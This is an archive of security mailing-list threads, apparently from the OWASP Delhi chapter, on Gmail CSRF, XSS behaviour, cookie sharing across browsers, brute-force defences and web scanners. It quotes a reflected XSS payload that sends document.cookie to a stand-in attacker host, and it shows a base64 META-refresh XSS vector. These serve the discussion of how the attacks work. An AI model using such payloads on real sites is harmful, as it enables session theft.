Subject: [Owasp-delhi] Regarding "Gmail CSRF Flaw"
Message-ID: <f162ba540903060254i46aa525fs6665997208fb04d2@mail.gmail.com>

Dear all,


Please have a look at the post regarding "Gmail CSRF Flaw" at:

http://ajaxian.com/archives/gmail-csrf-security-flaw
http://blogs.zdnet.com/security/?p=2773

Please give your comments that whether it is a CSRF vulnerability or not.

After i experimented this i found that to change the password to the new one
the Current Password must be sent within the GET

Request otherwise an error will be displayed.

I think that we cannot say it as a CSRF flaw because an additional security
measure is been applied by the application and that is

user's password without which this attack won't work.

Please suggest ...

Hi Parmendra,

The first one is a CSRF for sure.
Unlike the common understanding that CSRF is used to make a change on the 
website, this one reads sensitive information.
Its a known gotcha with JSON.

The second one is not really a CSRF.
But what can be done is to guess passwords (and change them ) by 
overcoming the account lockout feature.
Its not a CSRF issue but a flaw with the change password feature, ideally 
there should be some account logoff feature or something after a series of 
failed 'change password' attempts.

Hope this helps.

Thanks and Regards,

Dear Parmendra,

Exactly, what you said may be right in this specific case.
 But don't you think that the implementation in itself is wrong. In general
sense, in the case of Gmail the only token to authenticate the user is a
session cookie, and this cookie is sent automatically by the browser in
every request. That is the case of possible XSRF.
It might not have happend in this case because the attacker has to guess the
correct password in order to change it but if he guesses successfully then
what? The application should have a mechanism differentiate between the
request made by user and the one made by user unknowingly on behalf the
attacker.
Gmail lacks this mechanism. That's why it has been susceptible to various
CSRF attacks in the past like, mail filter attacks.
One mild ,not harming but good example of CSRF in Gmail:
  If I mail the 'Logout' link of Gmail to anybody who is currently  logged
in his Gmail account and if he clicks it, he gets logged out of
 his account.  Why? That is simply because there's lack of anti-XSRF
mechanism(like one time tokens,nonces,hidden fileds etc).
The server should identify the logged in user's request differently with one
that come with an external link's. Here  I am not talking about security
impact, rather I am elaborating on functioning of the link. Like, if the
'Logout' link when mailed to a logged in user manages to make him log out of
his session, should not happen. The server should identify and summarily
reject the external link's request. The 'Logout' link should carry some
tokens verifying which server may come to know that this is an currently
logged in user's request not an external one, and vice-versa.
I had reported this several time to Google. This is one of them:

Chris Evans [cevans at google.com]

Dear Chris,

   Today I came across the Gmail Change Password XSRF advisory.

http://seclists.org/fulldisclosure/2009/Mar/0029.html

 That?s what I had wanted to draw your attention in my subsequent mails
written to you. That was in the case of Logout Link, if mailed to a logged
in user and when clicked the user can be forcefully logged out. That was
because the only token to authenticate the user is a session cookie, and
this cookie is sent automatically by the browser in every request. That was
the case of possible XSRF.

And today?s disclosure proves my point.

------

Their response:

Hi Nilesh,

The "disclosure" you refer to does not represent a noteworthy issue. There
are many issues and subtleties with it, but one worth noting is that the
XSRF protection token in this is the user's password. In other words, a
user's password needs to be guessed?! Accordingly, the disclosure has not
been met with any excitement :)

Cheers
Chris

------

Hi Nilesh,

Hope all is well with you. Chris here from Google's Security Team. A
colleage of mine pointed out you have reported various security issues to us
recently. Thank you very much for taking the time to do that, and I wanted
to let you know where they stand.

Logout XSRF.
We will continue to track this, but as a low priority. As this is not any
security impact but a noteworthy issue.
Logout XSRF is kind of endemic to the way the web works. For example,
there's an attack you could term "cookie stuffing" whereby bombarding the
victim's browser will knock out cookies for authenticated sites and
effectively log the user out.
Thank you very much.
Cheers,
Chris, Google Security Team
-------
But my assessment reamains ths same...it's not the case of security impact
but it's a case of not using the antiXSRF mechanism.
That's why Gmail has been soft target for may times for XSRF attacks.

I will continue to disagree with them on the issue.

Dear All,

 

We are planning to host a chapter meeting at the end of March 2009. Call for
Papers (CFP) is now open and you may submit your presentation to me or
Puneet.

 

Also, during last meeting at BirlaSoft we found that lot of participants
wanted such meetings to happen during weekdays. I have published a small web
poll to gather your choices on Schedule and Location. Please spare 1.5mins
to participate in this polling and help us follow the majority of interest. 

 

Please follow this link to suggest your choice:
http://www.torridnet.com/owasp-meeting

 

Many Thanks,

Dhruv

ok! nice to see that.
If there is a little space out there, I can accommodate with "Building a
Defensive Stance for .NET Applications".

I've been working on it for long and want to share some good stuff. Its not
just .NET but more of deployment issues and awareness. Let me know.

oh btw, I opted for weekends :)

HI all
        i am testing a website in which normal XSS script is not accepted by
the application, it gives run time error. If i am encoded it into base64, it
gets saved on server but not get executed.

what would be the possible reason that the script is not getting executed,
even the script is saved by the application.

Do correct me if I am wrong, but doesn't encoding the XSS vector in a  
particular standard result in the vector being rendered harmless? Also  
in this case, the application may be encoding the input in a safe way  
at the server-side and therefore you would probably see a situation  
where the application takes in the input but encodes the dangerous  
characters to render them harmless.

These are just my 2 cents on the subject. I may be wrong. Would be  
interesting to get some more views on this.

I share my views with Mr. Abahay's that encoding the XSS vector might not be
executed by the server. That is the reason behind encoding/escaping user
input. The user's input is also made HTML encoded (output validation) while
presenting back to the user.
So I think ....encoding xss vector in base64 is not going to harm you.

However...wait for other expert comments!

In continuation of my previous mail...

As per Abrol Raj--
> "i am testing a website in which normal XSS script is not accepted by the

gets saved on server but not get executed.
> what would be the possible reason that the script is not getting executed,

Exactly....the application expects anything that can be again rendered back
to the user after interpretation of the code. That is the case when this is
exploited when there's no proper input validation in place and results in
XSS execution.

In case of supplying XSS vector in original form, the application knows how
to render it back to the user-- If HTML encoding is there(output validation)
it will just print the value as characters(i.e. no XSS); if HTML encodng is
not there it will get executed(i.e. XSS).

But in case of base64 encoding the application simply does not know 'what to
do with the code'. That payload is saved on the server instead of displaying
it.

However there are other ways to execute XSS with base64 encoding but they
are rare. One exaple is with META tag, not with user input interaction:

<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">



Wait for other expert comments.....

The application did not decode base64 data. It might have just saved base64
data as string, and then presented to the browser as string.

> If i am encoded it into base64, it gets saved on server but not get
executed.
The server was expecting a string, and accepted the input as string.

Did you try refining the attack based on the error message you received?
Did you try other encoding options which the server might recognize and
process?

Subject: [Owasp-delhi] Regarding XSS Issue
Message-ID: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>

Dear all,

I have a little problem regarding XSS and here it is....

To perform an XSS attack an attacker steals cookies (in this case) of an
already logged in user.

In this scenerio :

-> The user is logged in "VulnerableRealBank.com" website in *one browser*.

-> Now this user opens his email account in a *different browser* (and not
in the new tab of the above browser) and clicks upon the link given

http://VulnerableRealBank.com/index.php?sessionid=12412412<http://vulnerablerealbank.com/index.php?sessionid=12412412>
&

username=<script>document.location='http://attacker
host.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>

Now my Questions:

-> Will the script that is reflected back from the vulnerable domain is
capable to send the cookies to the atttacker that are maintained by the
first browser.

-> Is above thing possible if i says that i am using the browser version
that do not shares cookies for the same domain requests.

-> Is this the problem that is totally independent from the browsers
versions and is only the functionality of the script that is sending
cookies.

Waiting for your responses :-)

Hi Paramendra!

     Here are my attempted answers to your queries...

  It depends...I have seen examples when one account can be opened  in two
browsers simultaneosuly. In that case it is possible to steal the cookies
form the second browser also. Those are the case of web based mails and
other social networking sites. However, financial site must not behave like
this way.


>

I think then it's not possible.

I think, whatever way the browsers behave , the application--specially
financial sites-- must not let uers open two instances of same page or same
account. That way they can prevent this kind of attack.

Wait for other expert comments.... :)

In a different browser (and not tab), the Session ID cookie or any other
cookie will not be shared, therefore the attack would not execute.

>

I already answered the question. Different browser windows do not share
cookies.

>

>

No, this issue is dependent on the type of browsers. I have heard (and not
tried myself) that Chrome handles cookies the same way even in tabs. So it
depends on how a browser handles cookies in tabs and/or windows.

Hope that helps.

Whether cookies are shared between browser windows depends on various
factors like browser vendor and how the new browser windows is launched.
Due to these inconsistencies it is good for web application security
professionals to assume that cookies will be shared across browser windows
and tabs. As you might all know, cookies will not be shared across browsers
from different vendors.

Examples:

In Win XP SP3 IE7:
a. Cookies will be shared if the different browser windows belong to the
same process. During normal use, this happens when one right-clicks a link
and then chooses new tab or new window.
b. Cookies will not be shared if the browser windows belong to separate
processes. During normal use, this happens when Internet Explorer icon (in
desktop or startmenu) is double clicked.

In Win XP SP3 Firefox 3.0.x:
Firefox maintains only one process, so cookies are shared between all
windows and tabs.

Dear all,

I have a little problem regarding XSS and here it is....

To perform an XSS attack an attacker steals cookies (in this case) of an
already logged in user.

In this scenerio :

-> The user is logged in "VulnerableRealBank.com" website in one browser.

-> Now this user opens his email account in a different browser (and not in
the new tab of the?above browser) and clicks upon the link given

http://VulnerableRealBank.com/index.php?sessionid=12412412&
username=<script>document.location='http://attacker
host.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>

Now my Questions:

-> Will the script that is reflected back from the vulnerable domain is
capable to send the cookies to the atttacker that are maintained by the
first browser.

-> Is?above thing?possible if i says that i am using the browser version
that do not shares cookies for the same domain requests.

-> Is this the problem that is totally independent from the browsers
versions and?is only the functionality of the script that is sending
cookies.

Waiting for your responses :-)

Subject: [Owasp-delhi] Multiple cookies combined in a single Set-Cookie
	request
Message-ID: <e74e68850903192300p217a5f31vad0ec823ded9c650@mail.gmail.com>

Hello everyone,
I am facing a trouble setting multiple cookies combined in a single
Set-Cookie request. Though following RFC 2109 (
http://www.faqs.org/rfcs/rfc2109) <http://www.faqs.org/rfcs/rfc2109>, and
MSDN http://msdn.microsoft.com/en-us/library/aa384321(VS.85).aspx both IE
and firefox are non-responsive to the multiple cookies set in the single
Set-Cookie request.

I have tried the following on Apache / IIS Servers. (The type of webserver
may not be relevant since the Set-Cookie header is one and the same in the
HTTP responses. It is the browser which is not accepting the multiple
cookies set)


Trial #1
----Server response----------
Set-Cookie: a1=b1; a2=b2; a3=b3

----Client cookies-------------
Cookie: a1=b1

Trial #2
----Server response----------
Set-Cookie: a1=b1;a2=b2;a3=b3

----Client cookies-------------
Cookie: a1=b1

Trial #3 (I thought this would work, since it matches with what is written
in RFC..
but instead of creating new cookies, browser is setting the value of a1 to
be "b1, a2=b2, a3=b3")
----Server response----------
Set-Cookie: a1=b1, a2=b2, a3=b3
Xpad: avoid browser bug

----Client cookies-------------
Cookie: a1=b1, a2=b2, a3=b3

Could anyone put in any thoughts on this...

Ideally,the application should not let the two browsers hadle the same
session simultaneously.

Dear All,

After reading comments from different Experts i created a summary for this
important attack:

*Condition-1*

*Both vulnerable website and e-mail account are opened within the mini tabs
of the same parent browser:*

In this case as a user clicks upon the crafted link in e-mail either by

> right-clicking and opening it in in New Tab or in New Window
> just click it simply

In both the cases the XSS attack will occur. Again no matter which browser
you are using.

*Condition-2*

Both vulnerable website and e-mail account are opened within the Fresh
Browsers Windows (and no new tab).
In this case as a user clicks upon the crafted link in e-mail either by

> right-clicking and opening it in in New Tab or in New Window
> just click it simply

*The attack will occur only if:*

-> A Browser is used which shares cookies for the same domain opened across
different fresh browsers windows. ie: Chrome and Firefox 3.0.x handles
cookies in same way even in tabs/Windows.

*However many important websites especially financial do not allow users to
open two instances of the same site for the same user which is an important
security feature.*
**
*Please let me know if i am wrong at any point.
*

Hi,

Some concerns about your questions..

1-What is the difference between Trial#1 and Trial#2 ?
2-And are you saying that browsers in general don't set multiple cookies?
3-What programming language are you using?

Just curious, what would you get if you set multiple cookies like this:

header("Set-this: abc");
header("Set-that: def");

instead of

header("Set-cookie: a1=b1");
header("Set-cookie: a2=b2");

Let us know if you are able to set cookies this way?

It may be a language-independent bug, have a look:

1. http://bugs.php.net/bug.php?id=16803
2. http://bugs.php.net/bug.php?id=42273

Nothing much.. Just removed spaces between the individual cookies. Some
random hit and try :)

Not exactly. Multiple cookies are set by issuing multiple Set-Cookie
requests. But I need to merge all the cookie requests into one set-cookie
request.

Actually I tried the same with .NET, PHP. But again I believe the the
program does not matter as such; if the same HTTP response headers are
generated again and again.


Hope I answered your queries..

Hi All,

How would we go about securing a WAP site against turing test. There
are couple of challenges that we face.

1. We can't prompt the user with Captcha based on the number of
attempts from an IP address because many GPRS providers use a proxy.

2. Cookies? How do they help when launching a Brute Force without
submitting cookies?

Sameer, I dont understand what you mean by protection against 'Turing 
Test'.
If you are looking at protection against automated password-guessing 
attacks then its pretty simple.
The counter to display a captha or lock the account is not based on the IP 
or the cookie.
It depends on the user account.
If you get lets say five failed login attempts on a particular username 
then act on it, dont even bother with the IP and cookie.

If you were looking for something else then it might help to give more 
details.

Thanks and Regards,
Lavakumar K

Yes, like how Lavakumar pointed out, Turing tests are not IP based. All CAPTCHA does it just ensure that no automated activity happens.

 

If you need to respond based on number of attempts, then CAPTCHA is not the approach. In case you are using LDAP or AD for authentication, use the features in them to protect against brute force attack by locking the user after n attempts. If it is any other data store like RDBMS database, then define it internally by yourself within the application.

 

Before answering the second question, tell us what are you having in the cookie? It would help in understanding your thought process also on what is it that made you think of cookies? Greater details is what we need.

I haven?t used HP Webinspect nor heard anything high about it but somehow like AppScan in comparison to Acunetix. I also had good feedback about Cenzic but again, haven?t yet washed my hands with it.

Hi Parmendra,
 
        I have worked on Cenzic Hialstorm,Acunetix,WebInspect and Appscan as well. I have found Cenzic Hailstorm more powerful and felxible in terms of less false positives and tester interaction.
But in context of your query, I will vote for AppScan among Acunetix,AppScan and WebInspect.
 
Thanks,

I have worked on Acunetix,WebInspect and Appscan as well. I have not found
much difference between WebInspect and Appscan. I have also heard a tool
about NTOSpider but never got chance to make my hands dirty on it.

It would be better if you make a initial checklist document, tools
list and post it here.

then we all can add something into that list.

Report looks more biased towards Acunetix but still worth giving a look...

Hi Guys,

An interesting comparative case study "Analyzing the Effectiveness and
Coverage of Web Application Security Scanners"
by Larry Suto. This paper caused a lot of discussion & debate in the
industry.

Have a look and please share your views about Larry Suto's findings.
